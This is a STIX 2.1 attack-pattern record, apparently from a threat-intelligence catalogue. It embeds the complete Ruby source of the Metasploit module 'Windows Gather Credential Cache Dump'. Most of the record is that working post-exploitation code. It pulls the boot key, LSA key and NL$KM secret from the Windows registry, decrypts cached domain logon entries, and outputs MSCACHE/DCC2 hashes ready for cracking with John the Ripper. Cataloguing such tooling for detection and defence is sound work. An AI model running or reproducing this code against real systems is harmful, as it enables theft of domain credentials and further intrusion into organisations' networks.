{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e4420c79-ffe5-401b-8066-97b5c2b4eff2",
    "created": "2024-08-14T16:33:05.023362Z",
    "modified": "2024-08-14T16:33:05.023366Z",
    "name": "Windows Gather Credential Cache Dump",
    "description": " This module uses the registry to extract the stored domain hashes that have been cached as a result of a GPO setting. The default setting on Windows is to store the last ten successful logins.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/cachedump.rb",
            "external_id": "cachedump.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "http://lab.mediaservice.net/code/cachedump.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'English'\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Credential Cache Dump',\n        'Description' => %q{\n          This module uses the registry to extract the stored domain hashes that have been\n          cached as a result of a GPO setting. The default setting on Windows is to store\n          the last ten successful logins.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Maurizio Agazzini <inode[at]mediaservice.net>',\n          'mubix'\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'References' => [['URL', 'http://lab.mediaservice.net/code/cachedump.rb']],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_registry_open_key\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def check_gpo\n    gposetting = registry_getvaldata('HKLM\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon', 'CachedLogonsCount')\n    print_status(\"Cached Credentials Setting: #{gposetting} - (Max is 50 and 0 disables, and 10 is default)\")\n  end\n\n  def capture_nlkm(lsakey)\n    nlkm = registry_getvaldata('HKLM\\\\SECURITY\\\\Policy\\\\Secrets\\\\NL$KM\\\\CurrVal', '')\n\n    vprint_status(\"Encrypted NL$KM: #{nlkm.unpack('H*')[0]}\")\n\n    if lsa_vista_style?\n      nlkm_dec = decrypt_lsa_data(nlkm, lsakey)\n    elsif sysinfo['Architecture'] == ARCH_X64\n      nlkm_dec = decrypt_secret_data(nlkm[0x10..], lsakey)\n    else # 32 bits\n      nlkm_dec = decrypt_secret_data(nlkm[0xC..], lsakey)\n    end\n\n    return nlkm_dec\n  end\n\n  def parse_decrypted_cache(dec_data, s)\n    i = 0\n    hash = dec_data[i, 0x10]\n    i += 72\n\n    username = dec_data[i, s.userNameLength].split(\"\\x00\\x00\").first.gsub(\"\\x00\", '')\n    i += s.userNameLength\n    i += 2 * ((s.userNameLength / 2) % 2)\n\n    vprint_good \"Username\\t\\t: #{username}\"\n    vprint_good \"Hash\\t\\t: #{hash.unpack('H*')[0]}\"\n\n    if lsa_vista_style?\n      if (s.iterationCount > 10240)\n        iterationCount = s.iterationCount & 0xfffffc00\n      else\n        iterationCount = s.iterationCount * 1024\n      end\n      vprint_good \"Iteration count\\t: #{s.iterationCount} -> real #{iterationCount}\"\n    end\n\n    last = Time.at(s.lastAccess)\n    vprint_good \"Last login\\t\\t: #{last.strftime('%F %T')} \"\n\n    domain = dec_data[i, s.domainNameLength + 1]\n    i += s.domainNameLength\n\n    if (s.dnsDomainNameLength != 0)\n      dnsDomainName = dec_data[i, s.dnsDomainNameLength + 1].split(\"\\x00\\x00\").first.gsub(\"\\x00\", '')\n      i += s.dnsDomainNameLength\n      i += 2 * ((s.dnsDomainNameLength / 2) % 2)\n      vprint_good \"DNS Domain Name\\t: #{dnsDomainName}\"\n    end\n\n    if (s.upnLength != 0)\n      upn = dec_data[i, s.upnLength + 1].split(\"\\x00\\x00\").first.gsub(\"\\x00\", '')\n      i += s.upnLength\n      i += 2 * ((s.upnLength / 2) % 2)\n      vprint_good \"UPN\\t\\t\\t: #{upn}\"\n    end\n\n    if (s.effectiveNameLength != 0)\n      effectiveName = dec_data[i, s.effectiveNameLength + 1].split(\"\\x00\\x00\").first.gsub(\"\\x00\", '')\n      i += s.effectiveNameLength\n      i += 2 * ((s.effectiveNameLength / 2) % 2)\n      vprint_good \"Effective Name\\t: #{effectiveName}\"\n    end\n\n    if (s.fullNameLength != 0)\n      fullName = dec_data[i, s.fullNameLength + 1].split(\"\\x00\\x00\").first.gsub(\"\\x00\", '')\n      i += s.fullNameLength\n      i += 2 * ((s.fullNameLength / 2) % 2)\n      vprint_good \"Full Name\\t\\t: #{fullName}\"\n    end\n\n    if (s.logonScriptLength != 0)\n      logonScript = dec_data[i, s.logonScriptLength + 1].split(\"\\x00\\x00\").first.gsub(\"\\x00\", '')\n      i += s.logonScriptLength\n      i += 2 * ((s.logonScriptLength / 2) % 2)\n      vprint_good \"Logon Script\\t\\t: #{logonScript}\"\n    end\n\n    if (s.profilePathLength != 0)\n      profilePath = dec_data[i, s.profilePathLength + 1].split(\"\\x00\\x00\").first.gsub(\"\\x00\", '')\n      i += s.profilePathLength\n      i += 2 * ((s.profilePathLength / 2) % 2)\n      vprint_good \"Profile Path\\t\\t: #{profilePath}\"\n    end\n\n    if (s.homeDirectoryLength != 0)\n      homeDirectory = dec_data[i, s.homeDirectoryLength + 1].split(\"\\x00\\x00\").first.gsub(\"\\x00\", '')\n      i += s.homeDirectoryLength\n      i += 2 * ((s.homeDirectoryLength / 2) % 2)\n      vprint_good \"Home Directory\\t\\t: #{homeDirectory}\"\n    end\n\n    if (s.homeDirectoryDriveLength != 0)\n      homeDirectoryDrive = dec_data[i, s.homeDirectoryDriveLength + 1].split(\"\\x00\\x00\").first.gsub(\"\\x00\", '')\n      i += s.homeDirectoryDriveLength\n      i += 2 * ((s.homeDirectoryDriveLength / 2) % 2)\n      vprint_good \"Home Directory Drive\\t: #{homeDirectoryDrive}\"\n    end\n\n    vprint_good \"User ID\\t\\t: #{s.userId}\"\n    vprint_good \"Primary Group ID\\t: #{s.primaryGroupId}\"\n\n    relativeId = []\n    while (s.groupCount > 0)\n      # TODO: parse attributes\n      relativeId << dec_data[i, 4].unpack('V')[0]\n      i += 4\n      attributes = dec_data[i, 4].unpack('V')[0]\n      i += 4\n      s.groupCount -= 1\n    end\n\n    vprint_good \"Additional groups\\t: #{relativeId.join ' '}\"\n\n    if (s.logonDomainNameLength != 0)\n      logonDomainName = dec_data[i, s.logonDomainNameLength + 1].split(\"\\x00\\x00\").first.gsub(\"\\x00\", '')\n      i += s.logonDomainNameLength\n      i += 2 * ((s.logonDomainNameLength / 2) % 2)\n      vprint_good \"Logon domain name\\t: #{logonDomainName}\"\n    end\n\n    @credentials <<\n      [\n        username,\n        hash.unpack('H*')[0],\n        iterationCount,\n        logonDomainName,\n        dnsDomainName,\n        last.strftime('%F %T'),\n        upn,\n        effectiveName,\n        fullName,\n        logonScript,\n        profilePath,\n        homeDirectory,\n        homeDirectoryDrive,\n        s.primaryGroupId,\n        relativeId.join(' '),\n      ]\n\n    vprint_good '----------------------------------------------------------------------'\n    if lsa_vista_style?\n      return \"#{username.downcase}:$DCC2$#{iterationCount}##{username.downcase}##{hash.unpack('H*')[0]}:#{dnsDomainName}:#{logonDomainName}\\n\"\n    else\n      return \"#{username.downcase}:M$#{username.downcase}##{hash.unpack('H*')[0]}:#{dnsDomainName}:#{logonDomainName}\\n\"\n    end\n  end\n\n  def parse_cache_entry(cache_data)\n    j = Struct.new(\n      :userNameLength,\n      :domainNameLength,\n      :effectiveNameLength,\n      :fullNameLength,\n      :logonScriptLength,\n      :profilePathLength,\n      :homeDirectoryLength,\n      :homeDirectoryDriveLength,\n      :userId,\n      :primaryGroupId,\n      :groupCount,\n      :logonDomainNameLength,\n      :logonDomainIdLength,\n      :lastAccess,\n      :last_access_time,\n      :revision,\n      :sidCount,\n      :valid,\n      :iterationCount,\n      :sifLength,\n      :logonPackage,\n      :dnsDomainNameLength,\n      :upnLength,\n      :ch,\n      :enc_data\n    )\n\n    s = j.new\n\n    s.userNameLength = cache_data[0, 2].unpack('v')[0]\n    s.domainNameLength = cache_data[2, 2].unpack('v')[0]\n    s.effectiveNameLength = cache_data[4, 2].unpack('v')[0]\n    s.fullNameLength = cache_data[6, 2].unpack('v')[0]\n    s.logonScriptLength = cache_data[8, 2].unpack('v')[0]\n    s.profilePathLength = cache_data[10, 2].unpack('v')[0]\n    s.homeDirectoryLength = cache_data[12, 2].unpack('v')[0]\n    s.homeDirectoryDriveLength = cache_data[14, 2].unpack('v')[0]\n\n    s.userId = cache_data[16, 4].unpack('V')[0]\n    s.primaryGroupId = cache_data[20, 4].unpack('V')[0]\n    s.groupCount = cache_data[24, 4].unpack('V')[0]\n    s.logonDomainNameLength = cache_data[28, 2].unpack('v')[0]\n    s.logonDomainIdLength = cache_data[30, 2].unpack('v')[0]\n\n    # Removed (\"Q\") unpack and replaced as such\n    thi = cache_data[32, 4].unpack('V')[0]\n    tlo = cache_data[36, 4].unpack('V')[0]\n    q = (tlo.to_s(16) + thi.to_s(16)).to_i(16)\n    s.lastAccess = ((q / 10000000) - 11644473600)\n\n    s.revision = cache_data[40, 4].unpack('V')[0]\n    s.sidCount = cache_data[44, 4].unpack('V')[0]\n    s.valid = cache_data[48, 2].unpack('v')[0]\n    s.iterationCount = cache_data[50, 2].unpack('v')[0]\n    s.sifLength = cache_data[52, 4].unpack('V')[0]\n\n    s.logonPackage = cache_data[56, 4].unpack('V')[0]\n    s.dnsDomainNameLength = cache_data[60, 2].unpack('v')[0]\n    s.upnLength = cache_data[62, 2].unpack('v')[0]\n\n    s.ch = cache_data[64, 16]\n    s.enc_data = cache_data[96..]\n\n    return s\n  end\n\n  def decrypt_hash(edata, nlkm, ch)\n    rc4key = OpenSSL::HMAC.digest(OpenSSL::Digest.new('md5'), nlkm, ch)\n    rc4 = OpenSSL::Cipher.new('rc4')\n    rc4.key = rc4key\n    decrypted = rc4.update(edata)\n    decrypted << rc4.final\n\n    return decrypted\n  end\n\n  def decrypt_hash_vista(edata, nlkm, ch)\n    aes = OpenSSL::Cipher.new('aes-128-cbc')\n    aes.decrypt\n    aes.key = nlkm[16...32]\n    aes.padding = 0\n    aes.iv = ch\n\n    decrypted = ''\n    (0...edata.length).step(16) do |i|\n      decrypted << aes.update(edata[i, 16])\n    end\n\n    return decrypted\n  end\n\n  def run\n    @credentials = Rex::Text::Table.new(\n      'Header' => 'MSCACHE Credentials',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'Username',\n        'Hash',\n        'Hash iteration count',\n        'Logon Domain Name',\n        'DNS Domain Name',\n        'Last Login',\n        'UPN',\n        'Effective Name',\n        'Full Name',\n        'Logon Script',\n        'Profile Path',\n        'Home Directory',\n        'HomeDir Drive',\n        'Primary Group',\n        'Additional Groups'\n      ]\n    )\n\n    begin\n      print_status(\"Executing module against #{sysinfo['Computer']}\")\n      client.railgun.netapi32\n      join_status = client.railgun.netapi32.NetGetJoinInformation(nil, 4, 4)['BufferType']\n\n      if sysinfo['Architecture'] == ARCH_X64\n        join_status &= 0x00000000ffffffff\n      end\n\n      if join_status != 3\n        print_error('System is not joined to a domain, exiting..')\n        return\n      end\n\n      # Check policy setting for cached creds\n      check_gpo\n\n      print_status('Obtaining boot key...')\n      bootkey = capture_boot_key\n      vprint_status(\"Boot key: #{bootkey.unpack('H*')[0]}\")\n\n      print_status('Obtaining Lsa key...')\n      lsakey = capture_lsa_key(bootkey)\n      if lsakey.nil?\n        print_error('Could not retrieve LSA key. Are you SYSTEM?')\n        return\n      end\n\n      vprint_status(\"Lsa Key: #{lsakey.unpack('H*')[0]}\")\n\n      print_status('Obtaining NL$KM...')\n      nlkm = capture_nlkm(lsakey)\n      vprint_status(\"NL$KM: #{nlkm.unpack('H*')[0]}\")\n\n      print_status('Dumping cached credentials...')\n      ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SECURITY\\\\Cache', KEY_READ)\n\n      john = ''\n\n      ok.enum_value.each do |usr|\n        if !usr.name.match(/^NL\\$\\d+$/)\n          next\n        end\n\n        begin\n          nl = ok.query_value(usr.name.to_s).data\n        rescue StandardError\n          next\n        end\n\n        cache = parse_cache_entry(nl)\n\n        next unless (cache.userNameLength > 0)\n\n        vprint_status(\"Reg entry: #{nl.unpack('H*')[0]}\")\n        vprint_status(\"Encrypted data: #{cache.enc_data.unpack('H*')[0]}\")\n        vprint_status(\"Ch:  #{cache.ch.unpack('H*')[0]}\")\n\n        if lsa_vista_style?\n          dec_data = decrypt_hash_vista(cache.enc_data, nlkm, cache.ch)\n        else\n          dec_data = decrypt_hash(cache.enc_data, nlkm, cache.ch)\n        end\n\n        vprint_status(\"Decrypted data: #{dec_data.unpack('H*')[0]}\")\n\n        john << parse_decrypted_cache(dec_data, cache)\n      end\n\n      if lsa_vista_style?\n        print_status('Hash are in MSCACHE_VISTA format. (mscash2)')\n        p = store_loot('mscache2.creds', 'text/csv', session, @credentials.to_csv, 'mscache2_credentials.txt', 'MSCACHE v2 Credentials')\n        print_good(\"MSCACHE v2 saved in: #{p}\")\n\n        john = \"# mscash2\\n\" + john\n      else\n        print_status('Hash are in MSCACHE format. (mscash)')\n        p = store_loot('mscache.creds', 'text/csv', session, @credentials.to_csv, 'mscache_credentials.txt', 'MSCACHE v1 Credentials')\n        print_good(\"MSCACHE v1 saved in: #{p}\")\n        john = \"# mscash\\n\" + john\n      end\n\n      print_status('John the Ripper format:')\n      print_line john\n    rescue ::Interrupt\n      raise $ERROR_INFO\n    rescue ::Rex::Post::Meterpreter::RequestError => e\n      print_error(\"Meterpreter Exception: #{e.class} #{e}\")\n      print_error('This script requires the use of a SYSTEM user context (hint: migrate into service process)')\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}